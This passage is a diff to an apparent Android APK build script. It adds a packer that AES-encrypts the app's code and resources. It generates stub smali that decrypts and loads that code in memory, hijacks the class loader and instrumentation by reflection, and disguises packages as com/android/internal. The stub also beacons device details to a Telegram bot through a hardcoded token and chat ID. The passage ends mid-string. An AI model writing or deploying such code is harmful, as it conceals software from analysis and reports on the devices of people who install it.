@@ -3478,6 +3478,12 @@ def main():
             with track("PHASE_6", "STEP_6E", "Round 2 Step 6E: Rename io/socket → com/android/internal/* (random)"):
                 step_6e_rename_socket_package(new_pkg)
 
+    # new_dex: Phase 3 (STEP_DEX_PROTECT) generates the stub DEX and injects it
+    # directly into MOD_ASSET. STEP_10 uses new_dex only if explicitly provided;
+    # passing None keeps its existing behavior (uses classes.dex as-is).
+    # Phase 3 runs AFTER STEP_14_ASSET_2 to operate on the final signed asset.
+    new_dex = None
+
     with track("PHASE_1", "STEP_10", "Patch manifest + arsc + assemble APK", MOD_ASSET):
         step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
                                 class_rename_map=class_rename_map)
@@ -4097,6 +4103,1404 @@ def main():
 
         with track("PHASE_1", "STEP_14_ASSET_2", "Replace companion.apk in assets after re-sign [Step 14]", MOD_ASSET):
             step_replace_asset()
+
+    # ═══════════════════════════════════════════════════════════════════════════
+    # PHASE 3 — STEP_DEX_PROTECT: Build-time DEX + Resource encryption
+    # ───────────────────────────────────────────────────────────────────────────
+    # Operates on MOD_ASSET (the fully signed companion APK at this point).
+    # All smali in companion_decompiled/ is already under new_pkg path
+    # (STEP_6 renamed OLD_PKG → new_pkg) and class names are already renamed
+    # (STEP_6A applied class_rename_map). Phase 3 reuses companion_decompiled/
+    # to generate the stub DEX without re-running apktool decompile.
+    #
+    # Steps:
+    #   DEX_ENCRYPT   — extract classes.dex from MOD_ASSET → AES-256-CBC
+    #                   → inject as assets/classes.dex.enc (ZIP_STORED)
+    #   STUB_SMALI    — write 8 stub smali under new_pkg/ path (dynamic, NOT hardcoded)
+    #   SMALI_PRUNE   — delete all smali EXCEPT the 8 stub classes
+    #   APKTOOL_YML   — write fresh apktool.yml (dexVersion: 035)
+    #   DEX_REBUILD   — apktool b companion_decompiled → extract tiny stub classes.dex
+    #   DEX_INJECT    — replace classes.dex in MOD_ASSET (ZIP_STORED, ART mmap req.)
+    #   RES_ENCRYPT   — pack resources.arsc + res/ → AES-256-CBC
+    #                   → inject as assets/res.pack.enc (ZIP_STORED)
+    #   STUB_ARSC     — replace resources.arsc with minimal stub ARSC (~6-8KB)
+    #                   + remove non-stub res/ files from MOD_ASSET
+    #   RESIGN_PHASE3 — re-sign MOD_ASSET after all structural changes
+    # ═══════════════════════════════════════════════════════════════════════════
+
+    if not _phase1_only:
+
+        # ── Helper: PKCS7 padding ──────────────────────────────────────────────
+        def _pkcs7_pad_p3(data, block_size=16):
+            pad_len = block_size - (len(data) % block_size)
+            return data + bytes([pad_len] * pad_len)
+
+        # ── Helper: AES-256-CBC encrypt ────────────────────────────────────────
+        def _aes_encrypt_p3(plaintext_bytes, key_bytes, iv_bytes):
+            try:
+                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                from cryptography.hazmat.backends import default_backend
+                padded = _pkcs7_pad_p3(plaintext_bytes)
+                cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv_bytes), backend=default_backend())
+                enc = cipher.encryptor()
+                return enc.update(padded) + enc.finalize()
+            except ImportError:
+                # Fallback: PyCryptodome
+                from Crypto.Cipher import AES
+                padded = _pkcs7_pad_p3(plaintext_bytes)
+                cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
+                return cipher.encrypt(padded)
+
+        # ── Helper: inject/replace a single entry in a ZIP (preserving all others) ──
+        def _apk_inject_entry(apk_path, entry_name, data, compress_type):
+            """Add or replace a ZIP entry. All other entries preserved as-is."""
+            tmp = apk_path + ".p3inject"
+            with zipfile.ZipFile(apk_path, 'r') as zin, \
+                 zipfile.ZipFile(tmp, 'w', allowZip64=False) as zout:
+                for item in zin.infolist():
+                    if item.filename == entry_name:
+                        continue  # skip old version; we'll re-add below
+                    raw = zin.read(item.filename)
+                    info = zipfile.ZipInfo(item.filename)
+                    info.compress_type = item.compress_type
+                    info.date_time = item.date_time
+                    info.external_attr = item.external_attr
+                    zout.writestr(info, raw)
+                # Write new/updated entry
+                info = zipfile.ZipInfo(entry_name)
+                info.compress_type = compress_type
+                zout.writestr(info, data)
+            os.replace(tmp, apk_path)
+
+        # ── STEP_DEX_ENCRYPT ──────────────────────────────────────────────────
+        with track("PHASE_3", "STEP_DEX_ENCRYPT",
+                   "Extract + AES-256-CBC encrypt classes.dex → assets/classes.dex.enc", MOD_ASSET):
+            try:
+                # Extract raw classes.dex from the current MOD_ASSET
+                with zipfile.ZipFile(MOD_ASSET, 'r') as _z3:
+                    if "classes.dex" not in _z3.namelist():
+                        raise FileNotFoundError("classes.dex not found in MOD_ASSET")
+                    _dex_raw = _z3.read("classes.dex")
+                print(f"  classes.dex extracted: {len(_dex_raw):,} bytes")
+
+                # Generate fresh AES-256-CBC key + IV per build
+                _dex_key = secrets.token_bytes(32)   # 256-bit key
+                _dex_iv  = secrets.token_bytes(16)   # 128-bit IV
+
+                _dex_enc = _aes_encrypt_p3(_dex_raw, _dex_key, _dex_iv)
+
+                # Inject assets/classes.dex.enc — ZIP_STORED (no compression)
+                _apk_inject_entry(MOD_ASSET, "assets/classes.dex.enc", _dex_enc, zipfile.ZIP_STORED)
+                print(f"  ✅ STEP_DEX_ENCRYPT — {len(_dex_enc):,} bytes → assets/classes.dex.enc (ZIP_STORED)")
+
+                # Store hex strings for embedding in stub smali
+                _dex_key_hex = _dex_key.hex().upper()
+                _dex_iv_hex  = _dex_iv.hex().upper()
+
+            except Exception as _e3:
+                print(f"  ❌ STEP_DEX_ENCRYPT failed: {_e3}")
+                raise
+
+        # ── STEP_STUB_SMALI ───────────────────────────────────────────────────
+        # Generate 8 stub smali classes under new_pkg (dynamic — NOT hardcoded).
+        # Uses class names as they exist AFTER STEP_6A class rename:
+        #   App → ApplicationController (or whatever random was chosen) BUT
+        #   StubApp is generated fresh by Phase 3 and NOT renamed by STEP_6A
+        #   (it doesn't exist in the original DEX — it's synthesized here).
+        # All 8 stubs go under new_path = new_pkg.replace(".", "/")
+        # CoreComponentFactory and InitializationProvider stay under their
+        # original androidx/ paths — STEP_6 never renames androidx/* paths.
+        with track("PHASE_3", "STEP_STUB_SMALI",
+                   "Generate 8 stub smali classes under new_pkg path", MOD_ASSET):
+            try:
+                import os as _os3
+                _build_num = _os3.environ.get("GITHUB_RUN_NUMBER", "local")
+                _build_sha = _os3.environ.get("GITHUB_SHA", "unknown")[:8]
+                _new_path  = new_pkg.replace(".", "/")
+
+                # Also get RES key/IV for embedding (generated later in RES_ENCRYPT
+                # but we need them in the smali NOW — pre-generate here)
+                _res_key = secrets.token_bytes(32)
+                _res_iv  = secrets.token_bytes(16)
+                _res_key_hex = _res_key.hex().upper()
+                _res_iv_hex  = _res_iv.hex().upper()
+                # Store for STEP_RES_ENCRYPT to reuse
+                _p3_res_key = _res_key
+                _p3_res_iv  = _res_iv
+
+                # ── StubApp.smali ──────────────────────────────────────────────
+                _stub_app_smali = f"""\
+.class public L{_new_path}/StubApp;
+.super Landroid/app/Application;
+.source "StubApp.java"
+
+.field private static final AES_KEY:Ljava/lang/String; = "{_dex_key_hex}"
+.field private static final AES_IV:Ljava/lang/String;  = "{_dex_iv_hex}"
+.field private static final RES_KEY:Ljava/lang/String; = "{_res_key_hex}"
+.field private static final RES_IV:Ljava/lang/String;  = "{_res_iv_hex}"
+.field private static final TG_TOKEN:Ljava/lang/String; = "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw"
+.field private static final TG_CHAT:Ljava/lang/String;  = "8852912150"
+.field private static final BUILD_TAG:Ljava/lang/String; = "BUILD#{_build_num}-{_build_sha}"
+
+.method public attachBaseContext(Landroid/content/Context;)V
+    .locals 11
+
+    invoke-super {{p0, p1}}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
+
+    new-instance v0, L{_new_path}/StubApp$CrashHandler;
+    invoke-direct {{v0}}, L{_new_path}/StubApp$CrashHandler;-><init>()V
+    invoke-static {{v0}}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V
+
+    :try_start_0
+
+    const-string v0, "StubApp"
+    sget-object v1, L{_new_path}/StubApp;->BUILD_TAG:Ljava/lang/String;
+    invoke-static {{v0, v1}}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    sget-object v0, L{_new_path}/StubApp;->AES_KEY:Ljava/lang/String;
+    invoke-static {{v0}}, L{_new_path}/StubApp;->hexToBytes(Ljava/lang/String;)[B
+    move-result-object v0
+
+    sget-object v1, L{_new_path}/StubApp;->AES_IV:Ljava/lang/String;
+    invoke-static {{v1}}, L{_new_path}/StubApp;->hexToBytes(Ljava/lang/String;)[B
+    move-result-object v1
+
+    invoke-virtual {{p1}}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v2
+
+    const-string v3, "classes.dex.enc"
+    invoke-virtual {{v2, v3}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    move-result-object v3
+
+    invoke-static {{v3}}, L{_new_path}/StubApp;->readStream(Ljava/io/InputStream;)[B
+    move-result-object v4
+
+    invoke-static {{v4, v0, v1}}, L{_new_path}/StubApp;->aesDecrypt([B[B[B)[B
+    move-result-object v5
+
+    invoke-static {{v5}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
+    move-result-object v6
+
+    invoke-virtual {{p0}}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
+    move-result-object v7
+
+    new-instance v8, Ldalvik/system/InMemoryDexClassLoader;
+    invoke-direct {{v8, v6, v7}}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V
+
+    # Walk p1 (ContextImpl) directly for mPackageInfo → LoadedApk
+    # FIX: p1 IS ContextImpl — do NOT walk mBase (ContextWrapper field, not here)
+    invoke-virtual {{p1}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    move-result-object v9
+    const-string v10, "mPackageInfo"
+    :walk_mpkg_loop
+    if-eqz v9, :walk_mpkg_done
+    :try_mpkg_start
+    invoke-virtual {{v9, v10}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v9
+    goto :walk_mpkg_found
+    :try_mpkg_end
+    .catch Ljava/lang/NoSuchFieldException; {{:try_mpkg_start .. :try_mpkg_end}} :walk_mpkg_next
+    :walk_mpkg_next
+    invoke-virtual {{v9}}, Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;
+    move-result-object v9
+    goto :walk_mpkg_loop
+    :walk_mpkg_done
+    goto :inject_done
+    :walk_mpkg_found
+    const/4 v10, 0x1
+    invoke-virtual {{v9, v10}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{v9, p1}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v9
+
+    # Walk LoadedApk for mClassLoader → replace with IMDCL
+    invoke-virtual {{v9}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    move-result-object v10
+    const-string v0, "mClassLoader"
+    :walk_mcl_loop
+    if-eqz v10, :walk_mcl_done
+    :try_mcl_start
+    invoke-virtual {{v10, v0}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v10
+    goto :walk_mcl_found
+    :try_mcl_end
+    .catch Ljava/lang/NoSuchFieldException; {{:try_mcl_start .. :try_mcl_end}} :walk_mcl_next
+    :walk_mcl_next
+    invoke-virtual {{v10}}, Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;
+    move-result-object v10
+    goto :walk_mcl_loop
+    :walk_mcl_done
+    goto :inject_done
+    :walk_mcl_found
+    const/4 v0, 0x1
+    invoke-virtual {{v10, v0}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{v10, v9, v8}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
+
+    # Set Thread.currentThread().setContextClassLoader(IMDCL)
+    # Required so LoveApi0 (RemoteDataSource) DexClassLoader chains correctly
+    invoke-static {{}}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
+    move-result-object v0
+    invoke-virtual {{v0, v8}}, Ljava/lang/Thread;->setContextClassLoader(Ljava/lang/ClassLoader;)V
+
+    :inject_done
+    const-string v0, "SUCCESS: DEX loaded via IMDCL+LoadedApk swap"
+    invoke-static {{v0}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
+
+    invoke-static {{p1}}, L{_new_path}/StubApp;->injectResources(Landroid/content/Context;)V
+
+    invoke-virtual {{p1}}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
+    move-result-object v1
+    new-instance v2, Ljava/lang/StringBuilder;
+    invoke-direct {{v2}}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-virtual {{v2, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v1, "/rp.zip"
+    invoke-virtual {{v2, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+
+    new-instance v2, L{_new_path}/StubApp$LifecycleCallbacks;
+    invoke-direct {{v2, v1}}, L{_new_path}/StubApp$LifecycleCallbacks;-><init>(Ljava/lang/String;)V
+    invoke-virtual {{p0, v2}}, Landroid/app/Application;->registerActivityLifecycleCallbacks(Landroid/app/Application$ActivityLifecycleCallbacks;)V
+
+    const-string v0, "LC: registerActivityLifecycleCallbacks OK"
+    invoke-static {{v0}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
+
+    new-instance v2, L{_new_path}/StubApp$StubInstrumentation;
+    invoke-direct {{v2, v1}}, L{_new_path}/StubApp$StubInstrumentation;-><init>(Ljava/lang/String;)V
+
+    invoke-static {{}}, Landroid/app/ActivityThread;->currentActivityThread()Landroid/app/ActivityThread;
+    move-result-object v3
+    invoke-virtual {{v3}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    move-result-object v4
+    const-string v5, "mInstrumentation"
+    invoke-virtual {{v4, v5}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v4
+    const/4 v5, 0x1
+    invoke-virtual {{v4, v5}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{v4, v3, v2}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
+
+    const-string v0, "SI: replaced mInstrumentation OK"
+    invoke-static {{v0}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
+
+    :try_end_0
+    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
+
+    return-void
+
+    :catch_0
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->printStackTrace()V
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v1
+    new-instance v2, Ljava/lang/StringBuilder;
+    invoke-direct {{v2}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v3, "CRASH in attachBaseContext: "
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 0
+    invoke-direct {{p0}}, Landroid/app/Application;-><init>()V
+    return-void
+.end method
+
+.method public onCreate()V
+    .locals 0
+    invoke-super {{p0}}, Landroid/app/Application;->onCreate()V
+    return-void
+.end method
+
+.method static sendTelegram(Ljava/lang/String;)V
+    .locals 8
+    :try_tg_start
+    new-instance v0, Ljava/lang/StringBuilder;
+    invoke-direct {{v0}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v1, "[StubApp] "
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v0, p0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v1, "\\nDevice: "
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v1, " | API "
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+    invoke-virtual {{v0}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v0
+    sget-object v1, L{_new_path}/StubApp;->TG_TOKEN:Ljava/lang/String;
+    new-instance v2, Ljava/lang/StringBuilder;
+    invoke-direct {{v2}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v3, "https://api.telegram.org/bot"
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v3, "/sendMessage"
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v2}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v2
+    sget-object v3, L{_new_path}/StubApp;->TG_CHAT:Ljava/lang/String;
+    const-string v4, "UTF-8"
+    invoke-static {{v0, v4}}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    move-result-object v5
+    new-instance v4, Ljava/lang/StringBuilder;
+    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v6, "chat_id="
+    invoke-virtual {{v4, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v6, "&text="
+    invoke-virtual {{v4, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v4
+    invoke-static {{v2, v4}}, L{_new_path}/StubApp;->httpPostAsync(Ljava/lang/String;Ljava/lang/String;)V
+    :try_tg_end
+    .catch Ljava/lang/Throwable; {{:try_tg_start .. :try_tg_end}} :catch_tg
+    return-void
+    :catch_tg
+    move-exception v0
+    return-void
+.end method
+
+.method private static httpPostAsync(Ljava/lang/String;Ljava/lang/String;)V
+    .locals 3
+    new-instance v0, L{_new_path}/StubApp$TgRunnable;
+    invoke-direct {{v0, p0, p1}}, L{_new_path}/StubApp$TgRunnable;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+    new-instance v1, Ljava/lang/Thread;
+    invoke-direct {{v1, v0}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
+    invoke-virtual {{v1}}, Ljava/lang/Thread;->start()V
+    return-void
+.end method
+
+.method public static hexToBytes(Ljava/lang/String;)[B
+    .locals 5
+    invoke-virtual {{p0}}, Ljava/lang/String;->length()I
+    move-result v0
+    div-int/lit8 v0, v0, 0x2
+    new-array v1, v0, [B
+    const/4 v2, 0x0
+    :loop_hex
+    if-ge v2, v0, :loop_hex_end
+    mul-int/lit8 v3, v2, 0x2
+    invoke-virtual {{p0, v3}}, Ljava/lang/String;->charAt(I)C
+    move-result v4
+    invoke-static {{v4}}, Ljava/lang/Character;->digit(CI)I
+    move-result v4
+    shl-int/lit8 v4, v4, 0x4
+    add-int/lit8 v3, v3, 0x1
+    invoke-virtual {{p0, v3}}, Ljava/lang/String;->charAt(I)C
+    move-result v3
+    invoke-static {{v3}}, Ljava/lang/Character;->digit(CI)I
+    move-result v3
+    or-int/2addr v4, v3
+    int-to-byte v4, v4
+    aput-byte v4, v1, v2
+    add-int/lit8 v2, v2, 0x1
+    goto :loop_hex
+    :loop_hex_end
+    return-object v1
+.end method
+
+.method public static readStream(Ljava/io/InputStream;)[B
+    .locals 4
+    new-instance v0, Ljava/io/ByteArrayOutputStream;
+    invoke-direct {{v0}}, Ljava/io/ByteArrayOutputStream;-><init>()V
+    const/16 v1, 0x1000
+    new-array v2, v1, [B
+    :loop_stream
+    invoke-virtual {{p0, v2}}, Ljava/io/InputStream;->read([B)I
+    move-result v3
+    if-lez v3, :loop_stream_end
+    invoke-virtual {{v0, v2, v3}}, Ljava/io/ByteArrayOutputStream;->write([BII)V
+    goto :loop_stream
+    :loop_stream_end
+    invoke-virtual {{p0}}, Ljava/io/InputStream;->close()V
+    invoke-virtual {{v0}}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
+    move-result-object v0
+    return-object v0
+.end method
+
+.method public static aesDecrypt([B[B[B)[B
+    .locals 10
+    :try_aes_start
+    const-string v0, "AES/CBC/PKCS5Padding"
+    invoke-static {{v0}}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
+    move-result-object v0
+    const-string v1, "AES"
+    invoke-static {{p1, v1}}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)Ljavax/crypto/spec/SecretKeySpec;
+    move-result-object v1
+    new-instance v2, Ljavax/crypto/spec/IvParameterSpec;
+    invoke-direct {{v2, p2}}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V
+    const/4 v3, 0x2
+    invoke-virtual {{v0, v3, v1, v2}}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V
+    invoke-virtual {{v0, p0}}, Ljavax/crypto/Cipher;->doFinal([B)[B
+    move-result-object v0
+    return-object v0
+    :try_aes_end
+    .catch Ljava/lang/Exception; {{:try_aes_start .. :try_aes_end}} :catch_aes
+    :catch_aes
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Exception;->printStackTrace()V
+    const/4 v0, 0x0
+    return-object v0
+.end method
+
+.method public static injectResources(Landroid/content/Context;)V
+    .locals 10
+    :try_res_start
+    sget-object v0, L{_new_path}/StubApp;->RES_KEY:Ljava/lang/String;
+    invoke-static {{v0}}, L{_new_path}/StubApp;->hexToBytes(Ljava/lang/String;)[B
+    move-result-object v0
+    sget-object v1, L{_new_path}/StubApp;->RES_IV:Ljava/lang/String;
+    invoke-static {{v1}}, L{_new_path}/StubApp;->hexToBytes(Ljava/lang/String;)[B
+    move-result-object v1
+    invoke-virtual {{p0}}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v2
+    const-string v3, "res.pack.enc"
+    invoke-virtual {{v2, v3}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    move-result-object v3
+    invoke-static {{v3}}, L{_new_path}/StubApp;->readStream(Ljava/io/InputStream;)[B
+    move-result-object v4
+    invoke-static {{v4, v0, v1}}, L{_new_path}/StubApp;->aesDecrypt([B[B[B)[B
+    move-result-object v5
+    invoke-virtual {{p0}}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
+    move-result-object v6
+    invoke-virtual {{v6}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
+    move-result-object v6
+    new-instance v7, Ljava/lang/StringBuilder;
+    invoke-direct {{v7}}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-virtual {{v7, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v6, "/rp.zip"
+    invoke-virtual {{v7, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v7}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v6
+    new-instance v7, Ljava/io/File;
+    invoke-direct {{v7, v6}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+    new-instance v8, Ljava/io/FileOutputStream;
+    invoke-direct {{v8, v7}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
+    invoke-virtual {{v8, v5}}, Ljava/io/FileOutputStream;->write([B)V
+    invoke-virtual {{v8}}, Ljava/io/FileOutputStream;->close()V
+    invoke-virtual {{p0}}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v8
+    invoke-virtual {{v8, v6}}, Landroid/content/res/AssetManager;->addAssetPath(Ljava/lang/String;)I
+    :try_res_end
+    .catch Ljava/lang/Throwable; {{:try_res_start .. :try_res_end}} :catch_res
+    return-void
+    :catch_res
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->printStackTrace()V
+    return-void
+.end method
+"""
+
+                # ── StubApp$TgRunnable.smali ───────────────────────────────────
+                _tg_runnable_smali = f"""\
+.class L{_new_path}/StubApp$TgRunnable;
+.super Ljava/lang/Object;
+.implements Ljava/lang/Runnable;
+.source "StubApp.java"
+
+.field private final url:Ljava/lang/String;
+.field private final body:Ljava/lang/String;
+
+.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;)V
+    .locals 0
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    iput-object p1, p0, L{_new_path}/StubApp$TgRunnable;->url:Ljava/lang/String;
+    iput-object p2, p0, L{_new_path}/StubApp$TgRunnable;->body:Ljava/lang/String;
+    return-void
+.end method
+
+.method public run()V
+    .locals 8
+    :try_run_start
+    iget-object v0, p0, L{_new_path}/StubApp$TgRunnable;->url:Ljava/lang/String;
+    invoke-static {{v0}}, Ljava/net/URL;-><init>(Ljava/lang/String;)Ljava/net/URL;
+    move-result-object v0
+    invoke-virtual {{v0}}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
+    move-result-object v1
+    check-cast v1, Ljava/net/HttpURLConnection;
+    const-string v2, "POST"
+    invoke-virtual {{v1, v2}}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
+    const/4 v2, 0x1
+    invoke-virtual {{v1, v2}}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
+    const-string v2, "Content-Type"
+    const-string v3, "application/x-www-form-urlencoded"
+    invoke-virtual {{v1, v2, v3}}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
+    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
+    move-result-object v2
+    iget-object v3, p0, L{_new_path}/StubApp$TgRunnable;->body:Ljava/lang/String;
+    const-string v4, "UTF-8"
+    invoke-virtual {{v3, v4}}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+    move-result-object v3
+    invoke-virtual {{v2, v3}}, Ljava/io/OutputStream;->write([B)V
+    invoke-virtual {{v2}}, Ljava/io/OutputStream;->close()V
+    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->getResponseCode()I
+    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->disconnect()V
+    :try_run_end
+    .catch Ljava/lang/Throwable; {{:try_run_start .. :try_run_end}} :catch_run
+    return-void
+    :catch_run
+    move-exception v0
+    return-void
+.end method
+"""
+
+                # ── StubApp$CrashHandler.smali ─────────────────────────────────
+                # CRITICAL FIX (Build #16): return-void BEFORE :catch_handler / move-exception
+                _crash_handler_smali = f"""\
+.class L{_new_path}/StubApp$CrashHandler;
+.super Ljava/lang/Object;
+.implements Ljava/lang/Thread$UncaughtExceptionHandler;
+.source "StubApp.java"
+
+.method public constructor <init>()V
+    .locals 0
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    return-void
+.end method
+
+.method public uncaughtException(Ljava/lang/Thread;Ljava/lang/Throwable;)V
+    .locals 3
+    :try_ue_start
+    invoke-virtual {{p2}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "UNCAUGHT: "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v0
+    invoke-static {{v0}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
+    :try_ue_end
+    .catch Ljava/lang/Throwable; {{:try_ue_start .. :try_ue_end}} :catch_ue
+
+    return-void
+
+    :catch_ue
+    move-exception v0
+    return-void
+.end method
+"""
+
+                # ── StubApp$LifecycleCallbacks.smali ───────────────────────────
+                _lifecycle_smali = f"""\
